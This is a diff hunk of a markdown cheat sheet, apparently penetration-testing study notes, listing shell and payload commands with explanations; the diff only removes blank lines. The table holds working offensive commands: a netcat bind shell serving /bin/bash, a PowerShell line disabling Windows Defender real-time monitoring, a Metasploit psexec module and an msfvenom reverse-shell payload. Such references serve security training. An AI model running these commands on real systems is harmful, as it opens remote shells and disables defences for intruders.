@@ -9,12 +9,7 @@ List of types of reverse shells and payloads to use for different scenarios and 
 | `sudo nc -lvnp <port #>` | Starts a `netcat` listener on a specified port |  
 | `nc -nv <ip address of computer with listener started><port being listened on>` | Connects to a netcat listener at the specified IP address and port |  
 | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f` | Uses netcat to bind a shell (`/bin/bash`) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on |  
-
-
 | `Set-MpPreference -DisableRealtimeMonitoring $true` | PowerShell command using to disable real time monitoring in `Windows Defender`. |  
-
-
-
 | `use exploit/windows/smb/psexec` | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec` |  
 | `shell` | Command used in a meterpreter shell session to drop into a `system shell` |  
 | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload`. |  
